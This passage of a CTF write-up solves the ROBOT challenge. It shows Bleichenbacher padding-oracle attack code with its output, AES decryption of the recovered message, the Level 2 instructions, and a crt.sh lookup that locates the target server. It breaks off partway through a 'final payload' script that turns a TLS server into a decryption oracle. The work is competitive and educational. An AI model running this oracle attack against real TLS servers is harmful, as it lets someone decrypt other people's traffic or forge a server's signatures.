              print (s_new,q,oracle_good)
              if q == oracle_good:
                print ("s_new found",s_new)
                break
              s_new += 1

            print("Found s_new = {} in Step 2.a".format(s_new))

        elif i > 1 and len(set_m_old) >= 2:
            """
            Step 2.b: Searching with more than one interval left.
            If i > 1 and the number of intervals in M_{i−1} is at least 2, then search for the
            smallest integer s_i > s_{i−1}, such that the ciphertext c_0*(s_i)^e mod n is PKCS conforming.
            """

            print("Starting with Step 2.b")

            s_new = s_old + 1
            while True:
              c_d = (our_c * pow(s_new,e,N)) % N
              c = int(c_d).to_bytes(modulus_bytes, byteorder="big")
              q = oracle(c, messageflow=flow)
              print (s_new,q,oracle_good)
              if q == oracle_good:
                print ("s_new found",s_new)
                break
              s_new += 1

            print("Found s_new = {} in Step 2.b".format(s_new))

        elif len(set_m_old) == 1:
            """
            Step 2.c: Searching with one interval left.
            If M_{i−1} contains exactly one interval (i.e., M_{i−1} = {[a, b]}),
            then choose small integer values r_i, s_i such that

                r_i \geq 2 * (bs_{i-1} - 2B) / n

            and

                (2B + r_i*n) / b \leq s_i < (3B + r_i*n) / a,

            until the ciphertext c_0*(s_i)^e mod n is PKCS conforming.
            """

            print("Starting with Step 2.c")

            a, b = next(iter(set_m_old))
            found = False
            r = ceildiv(2 * (b * s_old - B2), n)
            while not found:
                for s in interval(ceildiv(B2 + r*n, b), floordiv(B3 - 1 + r*n, a)):
                  c_d = (our_c * pow(s,e,N)) % N
                  c = int(c_d).to_bytes(modulus_bytes, byteorder="big")
                  q = oracle(c, messageflow=flow)
                  print (s,q,oracle_good)
                  if q == oracle_good:
                    print ("s found",s)
                    found = True
                    s_new = s
                    break
                r += 1

            print("Found s_new = {} in Step 2.c".format(s_new))

        """
        Step 3: Narrowing the set of solutions.
        After s_i has been found, the set M_i is computed as

            M_i = \bigcup_{(a, b, r)} { [max(a, [2B+rn / s_i]), min(b, [3B-1+rn / s_i])] }

        for all [a, b] \in M_{i-1} and (as_i - 3B + 1)/(n) \leq r \leq (bs_i - 2B)/(n).
        """

        print("Starting with Step 3")

        set_m_new = set()
        for a, b in set_m_old:
            r_min = ceildiv(a * s_new - B3 + 1, n)
            r_max = floordiv(b * s_new - B2, n)

            print("Found new values for r and a = {}, b = {} -- {} <= r <= {}".format(a, b, r_min, r_max))

            for r in interval(r_min, r_max):
                new_lb = max(a, ceildiv(B2 + r*n, s_new))
                new_ub = min(b, floordiv(B3 - 1 + r*n, s_new))
                if new_lb <= new_ub:  # intersection must be non-empty
                    set_m_new |= {(new_lb, new_ub)}

        for v in set_m_new:
            print(str(v))
            print(";")

        print("")

        """
        Step 4: Computing the solution.
        If M_i contains only one interval of length 1 (i.e., M_i = {[a, a]}),
        then set m = a(s_0)^{−1} mod n, and return m as solution of m \equiv c^d (mod n).
        Otherwise, set i = i + 1 and go to step 2.
        """

        print("Starting with Step 4")

        if len(set_m_new) == 1:
            a, b = next(iter(set_m_new))
            if a == b:
                #print("Original:   ", hex(m))
                print("Calculated: ", hex(a))
                print("Success after {} calls to the oracle.".format(ct))
                exit(0)

        i += 1
        #print("Intervals retry", set_m_new)
        print("Going back to step 2")
        s_old = s_new
        set_m_old = set_m_new

        print("No luck for set_m_new = {} in Step 4".format(set_m_new))


"""
Found s_new = 628763230018232076192316524174627403033093932709318854405711796895336685445125914046965737795563557312174633415856645636915629234826504483069256500295289534866700827936273726427547843863857538764857166504567413981554453568090052145034012313708244067598472467010548393279295548635429983814068929132802368615967615344255852033257290519833659429593430858992086666802542855795253565396044379746432604792376293675231778904616909306131857882447205839943179370435741823899347112380441008421294819158984428968909843605940303199544682631467185927746673430938773748786749193082349807002596601869695214989690509237900604582 in Step 2.c
Starting with Step 3
Found new values for r and a = 1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457548, b = 1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457549 -- 33719114589252572075750924661695731741112359223584237692697067835210245803573579894086923058329424837644326952109680472528200844064410134517768941424181235770077826853495550059627427843434009658890946037358259925392562798208579147583141847256016322060852795823438707850390595985505541708394835174757839988722865459669396657267440380231328235672498948696605052883311247767341869901217827738902601566122703690727691458503095826994786379120415677348189100025897338019378091631906124448162471739208442812896593789788637566655879493840379915064269816911416023653028391481168707738586851333000913094460195191923691 <= r <= 33719114589252572075750924661695731741112359223584237692697067835210245803573579894086923058329424837644326952109680472528200844064410134517768941424181235770077826853495550059627427843434009658890946037358259925392562798208579147583141847256016322060852795823438707850390595985505541708394835174757839988722865459669396657267440380231328235672498948696605052883311247767341869901217827738902601566122703690727691458503095826994786379120415677348189100025897338019378091631906124448162471739208442812896593789788637566655879493840379915064269816911416023653028391481168707738586851333000913094460195191923691
(1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457549, 1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457549)

"""
```

Now we got the AES key "1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457549"!    
Now decrypt the message!  

```python
from Crypto.Cipher import AES
from Crypto.Util.number import bytes_to_long, long_to_bytes

data = open("aes_message.txt").read()
iv = long_to_bytes(0x79B63066F7BD752C14A246721DB6C54F)
key = long_to_bytes(1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457549)
print "%r" % key
key = key[-16:]
c = AES.new(key, AES.MODE_CBC, iv)
#print c.decrypt(data)
open("stage1_ans.txt","w").write(c.decrypt(data))
```
Finally, I got the message as follows.

```
Congratulations!

You have solved Level 1 of the ROBOT CTF.

In order to solve Level 2 you have to solve the following challenge:

You need to sign a message with the public key below. The message to be signed needs to be of the form:
"I solved the ROBOT CTF / [name]"

You can replace [name] with any string you want. It can be your real name, a nickname or something else
that will identify you in the list of winners.

The signature should be PKCS #1 v1.5 encoded, but not hashed. This is the format used by OpenSSL's
rsautl command. It should output the message if you pass it into openssl like this:

  openssl rsautl -verify -pubin -inkey [key] -in [signature]

An HTTPS server with a vulnerable TLS stack using this key is running. You'll have to find the server
yourself.

Once you succeed you can enter the signature hex-encoded into the form you will find at:
  https://final.robotattack.org/

Good luck!

-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAwYG6uMAYAYsQ52nrVep8
df9jKQFQnMPrTkLPn8BFEkaHXOqNqIlU+IPyIMaVgzgRXMTwN4miEFR1Yk0UYJVI
heCwvUCUaGbMsgZpFfKiJWRigLddgUm0BDM3Mz18hh8MxEQGX7ne9e6996e9yXva
MxInfSGS4EkmEJ9vwjJv1zsXOWjSYH1Mb/nuFIrK1WW8+K0qa7WjLqB1JUYFU7Z0
ZX6vVLyiz6mNMdQV+5z6uhaglsGnNcFVN5UfGq4EchRsINUr+um6rAY0Ed9zHCvv
mrBEQqetIhij1kGiZwshS7VXYH30Cff0PA691TL6c1d4JGTrtfFBt8FiwkKIXtzs
QCN2aHvHUcnWEhekOKcUHm1pBaULPc2elu6qT48YQj7SptxhRP2DPGDFO6nRZCmd
38oxs52FhGMz1YCq4BxMhNxZmcq71Ky9uVR4kpzV9m5z0THLO72rIfPgTAr3XrSI
Q4PjLFVcjQctO7VtXoTRmW/bDU/yVlXxzNLwNeCZm3WXO6aFLgQ4gcjR0s5xFyao
EOASiSzN4sine5wkkd74cU2Kwpmu9sKrCfaFfFD9VfcShO61Zv+yRrtM6N8J4ZFa
2jvXkcjjEqlm80gieiIKkcAA5cwZieFlxuErJDGzEwRU09M9h1JLQlUiV8gePiV4
7gUaw6QKCn7DxicJqE/KuDsCAwEAAQ==
-----END PUBLIC KEY-----

                           ╔═╦╗   ┌───┐                          
                           ║ ╚╩╦╦╦┘   └──┐                       
                           ║┌──┘╚╩═╦╗    └──┐                    
                         ┌─╩┘      ╚╩═╦╗    └──┐                 
                      ┌──┘            ╚╩═╦╗    └──┐              
                    ┌─┤                  ╚╩═╦╗    └──┐           
                    │ └──┐                  ╚╩═╦╗    └─┐         
                    │    └──┐                  ╚╩═╗   ┌┴┐        
                    │       └──┐                  ║┌──┘ │        
                    │          └──┐             ┌─╬┘    │        
                    │             └──┐       ┌──┘ ║     │        
                    │  ══╗           └──┐  ┌─┘    ║     │        
                    │    ╚══╗           └─┬┘      ║     │        
                    │       ╚═╱           │       Λ     │        
                    │        ╱  ══╗       │      ╱ ╲    │        
                    │       ╱     ╚══╗    │     ╱ Λ ╲   │        
                    │      ╱         ╚═   │    ╱ ╱ ╲ ╲  │        
                    │     ╱               │   ▕ ▕   ▏ ▏ │        
                    │    ╱                │    ╲ ╲ ╱ ╱  │        
                    │   ───┐              │     ╲ V ╱   │        
                  ┌─┤      └───           │      ╲ ╱    │        
               ┌──┘ │     ──┐             │       V     │        
             ┌─┘    │     ──┼──┐          │             │        
            ┌┴┐     ╚═╗     └──┼─         │             ├─┐      
            │ └──┐    ╚══╗     └─         │             │ └──┐   
            │    └──┐    ╚══╗             │           ╔═╝    └─┐ 
            │       └──┐    ╚══╗          │        ╔══╝       ┌┴┐
            │          └──┐    ╚══╗       │     ╔══╝       ┌──┘ │
            │             └──┐    ╚══╗    │  ╔══╝       ┌──┘    │
      ○○○○○○│                └──┐    ╚══╗ │╔═╝       ┌──┘       │
   ○○○○◙◙◙◙○│                   └──┐    ╚═╩╝      ┌──┘          │
 ○○○◙◙◙○○◙◙◙│                      └──┐         ┌─┘    ╱─┐      │
○○◙◙◙○○○○○◙◙│                         └─┐     ┌─┘     ╱  └───┐  │
○○○○○○○○○○◙◙│                           └─┐ ┌─┘      ╱       ╳──│
 ○○○○○○○○◙◙◙│                             └┬┘       ╱       ╱  ╱│
       ○○○○○│                              │       ╱       ╱  ╱ │
        ○○○○│                              │      ╱       ╱  ╱  │
            │                              │     ╱       ╱  ╱   │
            │                              │    ╱       ╱  ╱    │
            │                              │    ──┐    ╱  ╱     │
            │                              │ ○○○○○└───╳  ╱      │
            │                             ○○○○◙◙◙◙○○○○└─╱       │
            │                           ○○○◙◙◙○○◙◙◙◙◙○○         │
            └──┐                       ○○◙◙◙○○○○○◙◙◙◙○○         │
               └──┬┐                   ○○○○○○○○○○◙◙◙○○○         │
                  │└───┐                ○○○○○○○○◙◙◙○○○○       ┌─┘
                  │    └──┐                │  ○○○○○○○○     ┌──┘  
                  │       └┬─┐             │   ○○○○○○   ┌──┘     
                  │        │ └──┐          │         ┌┬─┘        
                  │        │    └┬─┐       │      ┌──┘│          
                  │        │     │ └──┐    │   ┌──┘   │          
                  │        │     │    └──┐ │┌──┘      │          
                  │        │     │       └┬┴┘         │          
                  │        │     │        │           │          
                  │        │     │        │           │          
                  │        │     │        │           │          
                  │        │     │        │           │          
                 ┌┤        │     │        │           │          
               ┌─┘│        │     │        │           │          
             ┌─┘  │        │     │        │           │          
            ┌┴─┐  └──┐     │   ┌─┤        │           │          
            │  └──┐  └───┐ │┌──┘ │        │           ├─┐        
            └──┐  └──┐   └─┴┘  ┌─┤        │           │ └──┐     
               └──┐  └──┐   ┌──┘┌┤        │         ┌─┘    └─┐   
                  └──┐  └─┬─┘ ┌─┘│        │      ┌──┘      ┌─┴┐  
                     └──┐ │ ┌─┘  └──┐     │   ┌──┘      ┌──┘  │  
                        └─┴─┼──┐    └───┐ │┌──┘      ┌──┘  ┌──┘  
                            │  └──┐     └─┴┘      ┌──┘  ┌──┘     
                            └──┐  └──┐         ┌──┘  ┌──┘        
                               └──┐  └──┐   ┌──┘  ┌──┘           
                                  └──┐  └─┬─┘  ┌──┘              
                                     └──┐ │ ┌──┘                 
                                        └─┴─┘                    
```

Now move to Level 2!

### Stage 2 (Web + Crypto).

#### 1. Search the server from the public key. (Web part)

All we have is the 4096 bit public-key.

```
Public-Key: (4096 bit)
Modulus:
    00:c1:81:ba:b8:c0:18:01:8b:10:e7:69:eb:55:ea:
    7c:75:ff:63:29:01:50:9c:c3:eb:4e:42:cf:9f:c0:
    45:12:46:87:5c:ea:8d:a8:89:54:f8:83:f2:20:c6:
    95:83:38:11:5c:c4:f0:37:89:a2:10:54:75:62:4d:
    14:60:95:48:85:e0:b0:bd:40:94:68:66:cc:b2:06:
    69:15:f2:a2:25:64:62:80:b7:5d:81:49:b4:04:33:
    37:33:3d:7c:86:1f:0c:c4:44:06:5f:b9:de:f5:ee:
    bd:f7:a7:bd:c9:7b:da:33:12:27:7d:21:92:e0:49:
    26:10:9f:6f:c2:32:6f:d7:3b:17:39:68:d2:60:7d:
    4c:6f:f9:ee:14:8a:ca:d5:65:bc:f8:ad:2a:6b:b5:
    a3:2e:a0:75:25:46:05:53:b6:74:65:7e:af:54:bc:
    a2:cf:a9:8d:31:d4:15:fb:9c:fa:ba:16:a0:96:c1:
    a7:35:c1:55:37:95:1f:1a:ae:04:72:14:6c:20:d5:
    2b:fa:e9:ba:ac:06:34:11:df:73:1c:2b:ef:9a:b0:
    44:42:a7:ad:22:18:a3:d6:41:a2:67:0b:21:4b:b5:
    57:60:7d:f4:09:f7:f4:3c:0e:bd:d5:32:fa:73:57:
    78:24:64:eb:b5:f1:41:b7:c1:62:c2:42:88:5e:dc:
    ec:40:23:76:68:7b:c7:51:c9:d6:12:17:a4:38:a7:
    14:1e:6d:69:05:a5:0b:3d:cd:9e:96:ee:aa:4f:8f:
    18:42:3e:d2:a6:dc:61:44:fd:83:3c:60:c5:3b:a9:
    d1:64:29:9d:df:ca:31:b3:9d:85:84:63:33:d5:80:
    aa:e0:1c:4c:84:dc:59:99:ca:bb:d4:ac:bd:b9:54:
    78:92:9c:d5:f6:6e:73:d1:31:cb:3b:bd:ab:21:f3:
    e0:4c:0a:f7:5e:b4:88:43:83:e3:2c:55:5c:8d:07:
    2d:3b:b5:6d:5e:84:d1:99:6f:db:0d:4f:f2:56:55:
    f1:cc:d2:f0:35:e0:99:9b:75:97:3b:a6:85:2e:04:
    38:81:c8:d1:d2:ce:71:17:26:a8:10:e0:12:89:2c:
    cd:e2:c8:a7:7b:9c:24:91:de:f8:71:4d:8a:c2:99:
    ae:f6:c2:ab:09:f6:85:7c:50:fd:55:f7:12:84:ee:
    b5:66:ff:b2:46:bb:4c:e8:df:09:e1:91:5a:da:3b:
    d7:91:c8:e3:12:a9:66:f3:48:22:7a:22:0a:91:c0:
    00:e5:cc:19:89:e1:65:c6:e1:2b:24:31:b3:13:04:
    54:d3:d3:3d:87:52:4b:42:55:22:57:c8:1e:3e:25:
    78:ee:05:1a:c3:a4:0a:0a:7e:c3:c6:27:09:a8:4f:
    ca:b8:3b
Exponent: 65537 (0x10001)
writing RSA key
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAwYG6uMAYAYsQ52nrVep8
df9jKQFQnMPrTkLPn8BFEkaHXOqNqIlU+IPyIMaVgzgRXMTwN4miEFR1Yk0UYJVI
heCwvUCUaGbMsgZpFfKiJWRigLddgUm0BDM3Mz18hh8MxEQGX7ne9e6996e9yXva
MxInfSGS4EkmEJ9vwjJv1zsXOWjSYH1Mb/nuFIrK1WW8+K0qa7WjLqB1JUYFU7Z0
ZX6vVLyiz6mNMdQV+5z6uhaglsGnNcFVN5UfGq4EchRsINUr+um6rAY0Ed9zHCvv
mrBEQqetIhij1kGiZwshS7VXYH30Cff0PA691TL6c1d4JGTrtfFBt8FiwkKIXtzs
QCN2aHvHUcnWEhekOKcUHm1pBaULPc2elu6qT48YQj7SptxhRP2DPGDFO6nRZCmd
38oxs52FhGMz1YCq4BxMhNxZmcq71Ky9uVR4kpzV9m5z0THLO72rIfPgTAr3XrSI
Q4PjLFVcjQctO7VtXoTRmW/bDU/yVlXxzNLwNeCZm3WXO6aFLgQ4gcjR0s5xFyao
EOASiSzN4sine5wkkd74cU2Kwpmu9sKrCfaFfFD9VfcShO61Zv+yRrtM6N8J4ZFa
2jvXkcjjEqlm80gieiIKkcAA5cwZieFlxuErJDGzEwRU09M9h1JLQlUiV8gePiV4
7gUaw6QKCn7DxicJqE/KuDsCAwEAAQ==
-----END PUBLIC KEY-----
```

How can we find the server?  
The key is in the paper of the ROBOT attack.  
<https://eprint.iacr.org/2017/1189.pdf>  
In page 28, you can find following command.  
`curl https://crt.sh/?d=F709E83727385F514321D9B2A64E26B1A195751BBC AB16BE2F2F34EBB084F6A9|openssl x509 -noout -pubkey > pubkey.key`  
"<https://crt.sh>" is the key. "crt.sh" is the Comodo organization's website that discovers certificates by continually monitoring all of the publicly known Certificate Transparency (CT) logs.(<https://www.comodo.com/news/press_releases/2015/06/comodo-launches-new-certificate-transparency-search-web-site.html>)  
The public key is searchable in crt.sh by SHA-256(SubjectPublicKeyInfo).  
I generated SubjectPublicKeyInfo as follows.  
ref. <https://stackoverflow.com/questions/36163093/how-do-we-generate-a-base64-encoded-sha256-hash-of-subjectpublickeyinfo-of-an-x>

```
$ cat > pubkey.txt
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAwYG6uMAYAYsQ52nrVep8
df9jKQFQnMPrTkLPn8BFEkaHXOqNqIlU+IPyIMaVgzgRXMTwN4miEFR1Yk0UYJVI
heCwvUCUaGbMsgZpFfKiJWRigLddgUm0BDM3Mz18hh8MxEQGX7ne9e6996e9yXva
MxInfSGS4EkmEJ9vwjJv1zsXOWjSYH1Mb/nuFIrK1WW8+K0qa7WjLqB1JUYFU7Z0
ZX6vVLyiz6mNMdQV+5z6uhaglsGnNcFVN5UfGq4EchRsINUr+um6rAY0Ed9zHCvv
mrBEQqetIhij1kGiZwshS7VXYH30Cff0PA691TL6c1d4JGTrtfFBt8FiwkKIXtzs
QCN2aHvHUcnWEhekOKcUHm1pBaULPc2elu6qT48YQj7SptxhRP2DPGDFO6nRZCmd
38oxs52FhGMz1YCq4BxMhNxZmcq71Ky9uVR4kpzV9m5z0THLO72rIfPgTAr3XrSI
Q4PjLFVcjQctO7VtXoTRmW/bDU/yVlXxzNLwNeCZm3WXO6aFLgQ4gcjR0s5xFyao
EOASiSzN4sine5wkkd74cU2Kwpmu9sKrCfaFfFD9VfcShO61Zv+yRrtM6N8J4ZFa
2jvXkcjjEqlm80gieiIKkcAA5cwZieFlxuErJDGzEwRU09M9h1JLQlUiV8gePiV4
7gUaw6QKCn7DxicJqE/KuDsCAwEAAQ==
-----END PUBLIC KEY-----
$ cat pubkey.txt | openssl pkey -pubin -outform der | openssl sha256
(stdin)= ef5da4b82c2945f0b3d726387d9038253dea8216d6572c261b317965b633ffc5
```

I searched "SHA-256(SubjectPublicKeyInfo) = 'ef5da4b82c2945f0b3d726387d9038253dea8216d6572c261b317965b633ffc5'" at crt.sh and found this certificate.

```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            03:7c:b4:ae:6c:32:87:e4:e8:4f:92:70:ee:d0:41:61:57:19
    Signature Algorithm: sha256WithRSAEncryption
        Issuer:
            commonName                = Let's Encrypt Authority X3
            organizationName          = Let's Encrypt
            countryName               = US
        Validity
            Not Before: Dec 16 09:06:07 2017 GMT
            Not After : Mar 16 09:06:07 2018 GMT
        Subject:
            commonName                = bxjyb2jvda.mindsculptors.net
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (4096 bit)
                Modulus:
                    00:c1:81:ba:b8:c0:18:01:8b:10:e7:69:eb:55:ea:
                    7c:75:ff:63:29:01:50:9c:c3:eb:4e:42:cf:9f:c0:
                    45:12:46:87:5c:ea:8d:a8:89:54:f8:83:f2:20:c6:
                    95:83:38:11:5c:c4:f0:37:89:a2:10:54:75:62:4d:
                    14:60:95:48:85:e0:b0:bd:40:94:68:66:cc:b2:06:
                    69:15:f2:a2:25:64:62:80:b7:5d:81:49:b4:04:33:
                    37:33:3d:7c:86:1f:0c:c4:44:06:5f:b9:de:f5:ee:
                    bd:f7:a7:bd:c9:7b:da:33:12:27:7d:21:92:e0:49:
                    26:10:9f:6f:c2:32:6f:d7:3b:17:39:68:d2:60:7d:
                    4c:6f:f9:ee:14:8a:ca:d5:65:bc:f8:ad:2a:6b:b5:
                    a3:2e:a0:75:25:46:05:53:b6:74:65:7e:af:54:bc:
                    a2:cf:a9:8d:31:d4:15:fb:9c:fa:ba:16:a0:96:c1:
                    a7:35:c1:55:37:95:1f:1a:ae:04:72:14:6c:20:d5:
                    2b:fa:e9:ba:ac:06:34:11:df:73:1c:2b:ef:9a:b0:
                    44:42:a7:ad:22:18:a3:d6:41:a2:67:0b:21:4b:b5:
                    57:60:7d:f4:09:f7:f4:3c:0e:bd:d5:32:fa:73:57:
                    78:24:64:eb:b5:f1:41:b7:c1:62:c2:42:88:5e:dc:
                    ec:40:23:76:68:7b:c7:51:c9:d6:12:17:a4:38:a7:
                    14:1e:6d:69:05:a5:0b:3d:cd:9e:96:ee:aa:4f:8f:
                    18:42:3e:d2:a6:dc:61:44:fd:83:3c:60:c5:3b:a9:
                    d1:64:29:9d:df:ca:31:b3:9d:85:84:63:33:d5:80:
                    aa:e0:1c:4c:84:dc:59:99:ca:bb:d4:ac:bd:b9:54:
                    78:92:9c:d5:f6:6e:73:d1:31:cb:3b:bd:ab:21:f3:
                    e0:4c:0a:f7:5e:b4:88:43:83:e3:2c:55:5c:8d:07:
                    2d:3b:b5:6d:5e:84:d1:99:6f:db:0d:4f:f2:56:55:
                    f1:cc:d2:f0:35:e0:99:9b:75:97:3b:a6:85:2e:04:
                    38:81:c8:d1:d2:ce:71:17:26:a8:10:e0:12:89:2c:
                    cd:e2:c8:a7:7b:9c:24:91:de:f8:71:4d:8a:c2:99:
                    ae:f6:c2:ab:09:f6:85:7c:50:fd:55:f7:12:84:ee:
                    b5:66:ff:b2:46:bb:4c:e8:df:09:e1:91:5a:da:3b:
                    d7:91:c8:e3:12:a9:66:f3:48:22:7a:22:0a:91:c0:
                    00:e5:cc:19:89:e1:65:c6:e1:2b:24:31:b3:13:04:
                    54:d3:d3:3d:87:52:4b:42:55:22:57:c8:1e:3e:25:
                    78:ee:05:1a:c3:a4:0a:0a:7e:c3:c6:27:09:a8:4f:
                    ca:b8:3b
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Extended Key Usage: 
                TLS Web Server Authentication, TLS Web Client Authentication
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Subject Key Identifier:
                50:6D:6A:8D:1B:DE:6D:EC:22:F5:63:E4:8B:23:D7:03:C5:4D:CC:97
            X509v3 Authority Key Identifier: 
                keyid:A8:4A:6A:63:04:7D:DD:BA:E6:D1:39:B7:A6:45:65:EF:F3:A8:EC:A1

            Authority Information Access: 
                OCSP - URI:http://ocsp.int-x3.letsencrypt.org
                CA Issuers - URI:http://cert.int-x3.letsencrypt.org/

            X509v3 Subject Alternative Name: 
                DNS:bxjyb2jvda.mindsculptors.net
            X509v3 Certificate Policies: 
                Policy: 2.23.140.1.2.1
                Policy: 1.3.6.1.4.1.44947.1.1.1
                  CPS: http://cps.letsencrypt.org
                  User Notice:
                    Explicit Text: This Certificate may only be relied upon by Relying Parties and only in accordance with the Certificate Policy found at https://letsencrypt.org/repository/

    Signature Algorithm: sha256WithRSAEncryption
         8d:a4:ff:36:ba:d3:e5:0a:90:93:d3:21:68:38:3b:94:e5:96:
         4c:1a:1b:8f:02:ff:1a:b6:a1:8c:59:39:fc:9b:38:50:ed:25:
         78:8b:35:81:9a:2b:71:64:a0:f2:a6:94:82:bf:f2:1e:65:f4:
         11:46:e4:73:01:b5:bf:b9:88:86:07:55:ff:78:16:89:6b:05:
         b4:23:f6:bd:66:58:89:24:38:5b:78:1d:74:1d:0f:13:ae:e4:
         ed:8e:ee:03:8c:5f:c0:18:3c:e7:6b:94:08:44:4b:d3:fc:7c:
         d9:79:1f:2b:17:46:ff:2e:4b:9a:59:00:9a:0e:74:27:de:b9:
         40:9d:6e:1d:f7:85:f6:5c:1f:48:73:13:0b:88:6b:23:02:bf:
         00:38:e0:34:49:8a:5e:92:a7:6d:7f:1a:ce:a0:ca:56:73:e5:
         a1:30:c7:89:61:93:02:bd:04:a9:45:2f:e0:da:ce:64:2f:c8:
         d0:fe:6a:87:b5:e6:75:a0:f9:0c:1c:e4:27:d1:74:5a:11:9e:
         33:dc:c5:24:97:5c:25:47:75:b7:3d:f3:d7:b2:1d:2d:22:c4:
         87:d5:ce:89:fc:0c:31:f6:ff:9c:45:dc:48:0b:3d:d9:bc:3b:
         85:1f:cc:3b:f4:17:ed:01:e2:92:ac:ec:7d:b9:c9:fb:0c:ed:
         73:0a:79:4d
```

This is what I was lookng for! "bxjyb2jvda.mindsculptors.net" is the target server.

#### 2. Again, Bleichenbacher attack! (Crypto)

Now, all you have to do is "decrypt" your plaintext message by Bleichenbacher attack. This means "signing" your message by the server's secret key. It took a long time, though... (In my enviroment, it took a whole day to get the answer!)

Final payload:
```python
#!/usr/bin/env python3

# standard modules
import math
import time
import sys
import socket
import os
import argparse
import ssl
import gmpy2
from cryptography import x509
from cryptography.hazmat.backends import default_backend

# This uses all TLS_RSA ciphers with AES and 3DES
ch_def = bytearray.fromhex("16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
ch_cbc = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS-RSA-WITH-AES-128-GCM-SHA256 (0x009c)
ch_gcm = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

ccs = bytearray.fromhex("000101")
enc = bytearray.fromhex("005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")

MSG_FASTOPEN = 0x20000000
# set to true if you want to generate a signature or if the first ciphertext is not PKCS#1 v1.5 conform
EXECUTE_BLINDING = True

def get_rsa_from_server(server, port):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("RSA")
        raw_socket = socket.socket()
        raw_socket.settimeout(timeout)
        s = ctx.wrap_socket(raw_socket)
        s.connect((server, port))
        cert_raw = s.getpeercert(binary_form=True)
        cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
        return cert_dec.public_key().public_numbers().n, cert_dec.public_key().public_numbers().e
    except ssl.SSLError as e:
        if not args.quiet:
            print("Cannot connect to server: %s" % e)
            print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
        if args.csv:
            # TODO: We could add an extra check that the server speaks TLS without RSA
            print("NORSA,%s,%s,,,,,,,," % (args.host, ip))
        quit()
    except (ConnectionRefusedError, socket.timeout) as e:
        if not args.quiet:
            print("Cannot connect to server: %s" % e)
            print("There seems to be no TLS on this host/port.")
        if args.csv:
            print("NOTLS,%s,%s,,,,,,,," % (args.host, ip))
        quit()

ct = 0

def oracle(pms, messageflow=False):
    global cke_version, ct
    ct += 1
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if not enable_fastopen:
            s.connect((ip, args.port))
            s.sendall(ch)
        else:
            s.sendto(ch, MSG_FASTOPEN, (ip, args.port))
        s.settimeout(timeout)
        buf = bytearray.fromhex("")
        i = 0
        bend = 0
        while True:
            # we try to read twice
            while i + 5 > bend:
                buf += s.recv(4096)
